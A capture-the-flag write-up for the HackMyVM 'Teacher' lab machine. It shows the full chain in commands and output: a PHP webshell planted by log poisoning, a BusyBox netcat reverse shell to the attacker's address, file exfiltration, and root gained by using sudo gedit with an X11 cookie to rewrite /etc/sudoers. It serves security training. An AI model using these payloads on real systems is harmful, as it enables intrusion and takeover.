# Teacher

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Teacher | WWFYMN | Beginner | HackMyVM |

**Summary:** The Teacher machine is a beginner-level Linux box that chains together multiple interesting attack vectors. Initial reconnaissance reveals a web server running Apache 2.4.54 with a custom index page hinting at a user named `mrteacher`. Web content discovery uncovers a PHP file (`access.php`) accepting a user-controlled `id` parameter that is reflected directly into a `<img src=''>` tag and stored into a separate log file (`log.php`). This stored value is later evaluated as PHP — a classic **log poisoning / file inclusion via stored parameter injection** vulnerability — yielding Remote Code Execution (RCE) as `www-data`. A rabbit-hole steganography image (`rabbit.jpg`) is planted to distract, but the real prize is a PDF file sitting in the web root owned by `mrteacher`, containing an SSH password written in reverse. Once on the box as `mrteacher`, privilege escalation is achieved by abusing `sudo` rights over `/bin/gedit` (a GUI text editor) with X11 forwarding and `/bin/xauth`. By forwarding the X11 MIT-MAGIC-COOKIE-1 token to the root context, the attacker opens `/etc/sudoers` as root via `sudo gedit` and rewrites the sudoers entry for `mrteacher` from a restricted command list to `NOPASSWD: ALL`, granting unrestricted passwordless `sudo` — and therefore a full root shell.

---

## Reconnaissance

### Host Discovery

The target machine was identified on the local network segment using a custom PowerShell network scanner:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.136 08:00:27:22:A1:2D VirtualBox
```

The target IP is **192.168.100.136**, confirmed as a VirtualBox guest by its MAC OUI.

---

### Port Scanning

A full TCP port scan with service/version detection was performed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ nmap -sC -sV -p- -T4 192.168.100.136
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 17:17 WIB
Nmap scan report for 192.168.100.136
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 1e:21:69:d3:57:da:3a:04:0b:6f:f4:50:fb:97:13:10 (RSA)
|   256 36:ee:7f:57:1d:a5:b5:ce:1f:41:ba:b0:43:32:2e:ff (ECDSA)
|_  256 f2:bd:80:dd:e5:05:02:49:c3:3b:9f:83:29:cb:54:96 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian 5+deb11u1 |
| 80/tcp | HTTP | Apache httpd 2.4.54 (Debian) |

Only two ports are exposed: SSH and a web server. The attack surface begins with HTTP.

---

## Web Enumeration

### Index Page Inspection

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ curl -i http://192.168.100.136/
HTTP/1.1 200 OK
Date: Fri, 27 Feb 2026 10:18:06 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Fri, 26 Aug 2022 12:51:13 GMT
ETag: "13b-5e7245e79ca4a"
Accept-Ranges: bytes
Content-Length: 315
Vary: Accept-Encoding
Content-Type: text/html

<html>
<h1>Hi student, make this server secure please.</h1>
<p>Our first server got hacked by cool and avijneyam in the first hour, that server was just a test but this server is important becouse this will be used for teaching, if we get hacked you are getting an F</p>
<!-- Yes mrteacher I will do it -->
</html>
```

The HTML source contains an HTML comment `<!-- Yes mrteacher I will do it -->`, confirming a valid username: **`mrteacher`**. This will be useful for SSH access later.

---

### Directory & File Brute-Force

Gobuster was run with a medium-sized DirBuster wordlist, including extensions commonly left on web servers:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ gobuster dir -u http://192.168.100.136/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,js,html,zip,jpg,png,log
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.136/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              png,log,txt,php,js,html,zip,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 315]
/log.php              (Status: 200) [Size: 26]
/manual               (Status: 301) [Size: 319] [--> http://192.168.100.136/manual/]
/access.php           (Status: 200) [Size: 12]
/rabbit.jpg           (Status: 200) [Size: 130469]
```

Four interesting items were discovered:
- **`/log.php`** — appears to be a logging endpoint
- **`/access.php`** — minimal response size (12 bytes), implies a template or parameter-driven page
- **`/rabbit.jpg`** — an image (a potential steganography challenge)

---

### Investigating `log.php` and `access.php`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ curl -i http://192.168.100.136/log.php
HTTP/1.1 200 OK
Date: Fri, 27 Feb 2026 10:20:14 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 25
Content-Type: text/html; charset=UTF-8

your logs:

rabbit.jpg

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ curl -i http://192.168.100.136/access.php
HTTP/1.1 200 OK
Date: Fri, 27 Feb 2026 10:20:20 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 12
Content-Type: text/html; charset=UTF-8

<img src=''>
```

`log.php` renders logs and currently shows `rabbit.jpg`. `access.php` returns an `<img src=''>` tag with an empty source — strongly suggesting it takes a parameter that gets reflected directly into the `src` attribute and likely logged to `log.php`.

---

### The Rabbit Hole — Steganography in `rabbit.jpg`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ wget http://192.168.100.136/rabbit.jpg
--2026-02-27 17:20:46--  http://192.168.100.136/rabbit.jpg
Connecting to 192.168.100.136:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 130469 (127K) [image/jpeg]
Saving to: 'rabbit.jpg'

rabbit.jpg     100% 127.41K  --.-KB/s    in 0.02s

2026-02-27 17:20:46 (7.80 MB/s) - 'rabbit.jpg' saved [130469/130469]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ file rabbit.jpg
rabbit.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 900x900, components 3

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ stegseek rabbit.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "rabbithole"
[i] Original filename: "secret.txt".
[i] Extracting to "rabbit.jpg.out".


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ cat rabbit.jpg.out
RabbitHole lol
```

`stegseek` cracked the steganography passphrase (`rabbithole`) and extracted a hidden `secret.txt` — which literally says **"RabbitHole lol"**. This is an intentional red herring planted by the challenge author. The real path forward lies in `access.php`.

---

## Initial Access

### Parameter Discovery on `access.php`

With `access.php` returning a static 12-byte response by default, `ffuf` was used to fuzz for GET parameters that change the response size:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ ffuf -u http://192.168.100.136/access.php?FUZZ=test -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 12

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.136/access.php?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12

________________________________________________

id                      [Status: 200, Size: 16, Words: 2, Lines: 1, Duration: 20ms]
```

The parameter `id` was discovered. Passing `id=id` confirms direct reflection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ curl -i http://192.168.100.136/access.php?id=id
HTTP/1.1 200 OK
Date: Fri, 27 Feb 2026 10:32:25 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 14
Content-Type: text/html; charset=UTF-8

<img src='id'>
```

Whatever is passed to `?id=` is reflected verbatim into `<img src='...'>` and stored in `log.php`.

---

### Log Poisoning — Injecting a PHP Web Shell

Because `log.php` renders the value stored from `access.php` and the server is running PHP, the value can be **poisoned with a PHP code snippet**. By passing a PHP one-liner as the `id` parameter, the webshell payload gets written into the log:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ curl -i "http://192.168.100.136/access.php?id=%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E"
HTTP/1.1 200 OK
Date: Fri, 27 Feb 2026 10:35:00 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 42
Content-Type: text/html; charset=UTF-8

...
```
as shown in the picture.
![alt text](image-1.png)
The URL-decoded payload is ![alt text](image-2.png). This is now stored inside the log. When `log.php` is loaded by the PHP engine, the stored PHP code **is executed**. Proof of RCE:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ curl http://192.168.100.136/log.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$
```

Remote Code Execution confirmed as **`www-data`**.

---

### Reverse Shell

A netcat listener was set up on the attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

The shell was triggered using BusyBox's netcat (which supports the `-e` flag for executing a process):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ curl http://192.168.100.136/log.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

Connection received and upgraded to a fully interactive TTY:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59591
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@Teacher:/var/www/html$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@Teacher:/var/www/html$ export SHELL=/bin/bash
www-data@Teacher:/var/www/html$ export TERM=xterm-256color
www-data@Teacher:/var/www/html$ stty rows 50 cols 200
```

---

### Internal Enumeration — Web Root Discovery

```bash
www-data@Teacher:/var/www/html$ ls -la
total 5532
drwxr-xr-x 2 root      root         4096 Aug 26  2022 .
drwxr-xr-x 3 root      root         4096 Aug 24  2022 ..
-rw-r--r-- 1 root      root          191 Aug 25  2022 access.php
-rw-r--r-- 1 root      root           48 Aug 26  2022 clearlogs.php
-rw-r--r-- 1 mrteacher mrteacher 5301604 Aug 25  2022 e14e1598b4271d8449e7fcda302b7975.pdf
-rw-r--r-- 1 root      root          315 Aug 26  2022 index.html
-rwxrwxrwx 1 root      root       204436 Feb 27 14:35 log.php
-rw-r--r-- 1 root      root       130469 Aug 26  2022 rabbit.jpg
```

A notable file stands out: **`e14e1598b4271d8449e7fcda302b7975.pdf`** — a 5MB PDF owned by `mrteacher`. The world-readable permissions allow `www-data` to serve and exfiltrate it.

---

### Exfiltrating the PDF

A temporary Python HTTP server was launched on the victim to transfer the PDF:

```bash
www-data@Teacher:/var/www/html$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.100.1 - - [27/Feb/2026 16:23:12] "GET /e14e1598b4271d8449e7fcda302b7975.pdf HTTP/1.1" 200 -
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ wget http://192.168.100.136:8080/e14e1598b4271d8449e7fcda302b7975.pdf
--2026-02-27 19:23:14--  http://192.168.100.136:8080/e14e1598b4271d8449e7fcda302b7975.pdf
Connecting to 192.168.100.136:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5301604 (5.1M) [application/pdf]
Saving to: 'e14e1598b4271d8449e7fcda302b7975.pdf'

e14e1598b4271d8449e7fc 100%[==========================>]   5.06M  22.3MB/s    in 0.2s

2026-02-27 19:23:14 (22.3 MB/s) - 'e14e1598b4271d8449e7fcda302b7975.pdf' saved [5301604/5301604]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ open e14e1598b4271d8449e7fcda302b7975.pdf
```

Upon opening the PDF, a password is found written **in reverse** inside the document. Reversing it yields the SSH password for `mrteacher`.

---

### SSH as `mrteacher` & User Flag

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ ssh mrteacher@192.168.100.136
...
mrteacher@Teacher:~$ ls -la
total 44
drwxr-xr-x 5 mrteacher mrteacher 4096 Feb 27 17:19 .
drwxr-xr-x 3 root      root      4096 Aug 24  2022 ..
-rw------- 1 mrteacher mrteacher   34 Sep  6  2022 .bash_history
-rw-r--r-- 1 mrteacher mrteacher  220 Aug 24  2022 .bash_logout
-rw-r--r-- 1 mrteacher mrteacher 3541 Aug 28  2022 .bashrc
drwx------ 3 mrteacher mrteacher 4096 Aug 26  2022 .cache
drwx------ 6 mrteacher mrteacher 4096 Aug 26  2022 .config
drwxr-xr-x 3 mrteacher mrteacher 4096 Aug 26  2022 .local
-rw-r--r-- 1 mrteacher mrteacher  807 Aug 24  2022 .profile
-rw-r--r-- 1 mrteacher mrteacher   33 Aug 26  2022 user
-rw------- 1 mrteacher mrteacher   53 Sep  5  2022 .Xauthority
```

---

## Privilege Escalation

### `sudo -l` — Identifying Allowed Commands

```bash
mrteacher@Teacher:~$ sudo -l
Matching Defaults entries for mrteacher on Teacher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrteacher may run the following commands on Teacher:
    (ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth
mrteacher@Teacher:~$ ls -la /bin/gedit /bin/xauth
-rwxr-xr-x 1 root root 14488 Dec  7  2020 /bin/gedit
-rwxr-xr-x 1 root root 52680 Jan  5  2021 /bin/xauth
mrteacher@Teacher:~$ file /bin/gedit /bin/xauth
/bin/gedit: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=367dbdcf0ba7308a86b05b3074ebf75d1ccd0cab, for GNU/Linux 3.2.0, stripped
/bin/xauth: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=83f77360916efcef9a0133bae57621b7ac54c731, for GNU/Linux 3.2.0, stripped
```

`mrteacher` can run **`gedit`** (a graphical text editor) and **`xauth`** (an X11 authentication utility) as root without a password. `gedit` requires a graphical display — running it without one fails immediately:

```bash
mrteacher@Teacher:~$ sudo /bin/gedit
Unable to init server: Could not connect: Connection refused

(gedit:855): Gtk-WARNING **: 17:27:28.911: cannot open display:
```

The key insight: `xauth` can be used to forward the X11 MIT-MAGIC-COOKIE-1 into root's X authority, enabling `sudo gedit` to open on the attacker's forwarded X display.

---

### Exploiting `xauth` + `gedit` with X11 Forwarding

SSH was re-established with X11 forwarding enabled (`-X`), which creates an `XAUTHORITY` session for the user:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/teacher]
└─$ ssh mrteacher@192.168.100.136 -X
...
mrteacher@Teacher:~$ xauth list
Teacher/unix:10  MIT-MAGIC-COOKIE-1  0b1a22f8abead5bdc16c3ab92b9a0deb
```

The display cookie for `Teacher/unix:10` was obtained. Now `sudo xauth add` was used to inject this cookie into **root's** X authentication database — a critical step because `sudo gedit` runs as root and needs to access root's `XAUTHORITY`:

```bash
mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  0b1a22f8abead5bdc16c3ab92b9a0deb
mrteacher@Teacher:~$ sudo gedit /etc/sudoers

(gedit:825): dconf-WARNING **: 19:20:13.976: failed to commit changes to dconf: Failed to execute child process "dbus-launch" (No such file or directory)
```

The `dconf` warning is harmless. `gedit` opened `/etc/sudoers` as root in the X11-forwarded GUI window. The `mrteacher` sudoers line was edited from:

```
mrteacher    ALL=(ALL:ALL) NOPASSWD: /bin/gedit, /bin/xauth
```

to:

```
mrteacher    ALL=(ALL:ALL) NOPASSWD: ALL
```

The screenshot below shows the final state of the `/etc/sudoers` file as edited in `gedit`:

![sudoers](image.png)

As confirmed in the image: **line 23** reads `mrteacher    ALL=(ALL:ALL) NOPASSWD: ALL` — granting `mrteacher` unrestricted passwordless sudo access to all commands.

---

### Root Shell & Flags

After saving the file in `gedit`, `sudo -l` was verified and `sudo -i` was used to escalate to root:

```bash
mrteacher@Teacher:~$ sudo -l
Matching Defaults entries for mrteacher on Teacher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrteacher may run the following commands on Teacher:
    (ALL : ALL) NOPASSWD: ALL
mrteacher@Teacher:~$ sudo -i
root@Teacher:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Teacher:~# whoami
root
root@Teacher:~# hostname
Teacher
root@Teacher:~# cat /home/mrteacher/user /root/root
9cd[REDACTED]
Hap[REDACTED]
```

Both the **user flag** (`/home/mrteacher/user`) and the **root flag** (`/root/root`) were captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP port scan with `nmap -sC -sV -p- -T4` revealed two open ports — SSH (22) and HTTP (80, Apache 2.4.54 on Debian). The HTTP index page's HTML source commented `<!-- Yes mrteacher I will do it -->`, leaking the username `mrteacher`.

2. **Vulnerability Discovery**: Gobuster enumeration uncovered `access.php` (12-byte response with `<img src=''>`) and `log.php` (which rendered previously logged values). `ffuf` parameter fuzzing on `access.php` identified the `?id=` parameter. Manual testing confirmed that whatever value is passed to `?id=` is stored in `log.php` and rendered without sanitization — establishing a **log poisoning** primitive.

3. **Exploitation (RCE → Reverse Shell)**: A PHP webshell payload was URL-encoded and injected via `access.php?id=...`. When `log.php` was subsequently requested, the PHP engine evaluated the stored payload, achieving RCE as `www-data`. A BusyBox `nc -e` reverse shell was triggered through `log.php?cmd=busybox+nc+...` and upgraded to a full interactive TTY via `python3 -c 'import pty;pty.spawn("/bin/bash")'` and `stty raw -echo; fg`.

4. **Internal Enumeration**: The web root `/var/www/html` contained a world-readable PDF file (`e14e1598b4271d8449e7fcda302b7975.pdf`) owned by `mrteacher`. A temporary Python HTTP server (`python3 -m http.server 8080`) was used to exfiltrate the PDF. Inside the PDF, the SSH password for `mrteacher` was found written **in reverse**. Reversing the string and authenticating via SSH granted shell access as `mrteacher` and the **user flag**.

5. **Privilege Escalation**: `sudo -l` revealed `mrteacher` could run `/bin/gedit` and `/bin/xauth` as root with no password. Since `gedit` requires a graphical display, SSH was re-established with X11 forwarding (`ssh -X`). The X11 MIT-MAGIC-COOKIE-1 (`0b1a22f8abead5bdc16c3ab92b9a0deb`) was injected into root's X authority via `sudo xauth add`. `sudo gedit /etc/sudoers` then opened the sudoers file as root in the GUI. The `mrteacher` entry was modified from `NOPASSWD: /bin/gedit, /bin/xauth` to `NOPASSWD: ALL`. After saving, `sudo -i` yielded a root shell, and both flags were read.